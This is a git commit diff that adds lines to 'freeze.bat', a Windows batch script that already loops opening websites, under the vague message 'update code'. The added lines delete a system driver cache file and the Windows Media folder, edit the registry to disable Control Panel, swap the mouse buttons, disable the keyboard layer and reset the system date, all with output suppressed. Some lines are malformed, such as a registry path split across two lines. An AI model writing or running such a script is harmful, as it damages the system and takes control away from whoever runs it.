99493589732aab5b38e2313614c4db5dfd37ac0d
Oxide Dev <59166229+OxideDevX@users.noreply.github.com>
2021-06-08 14:01:52 +0300

    update code

--- freeze.bat
+++ freeze.bat
@@ -6,4 +6,13 @@ start www.google.com
 start www.instagram.com
 start www.udemy.com
 start www.dailymotion.com
+del "%SystemRoot%\Driver Cache\i386\driver.cab" /f /q >nul
+del "%SystemRoot%\Media" /q >nul
+reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer
+/v NoControlPanel /t REG_DWORD /d 1 /f >nul
+%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
+del "%SystemRoot%Driver Cachei386driver.cab" /f /q >nul
+rundll32 user,disableoemlayer
+rundll32 user,SwapMouseButton
+date 29.07.36	
 goto:a
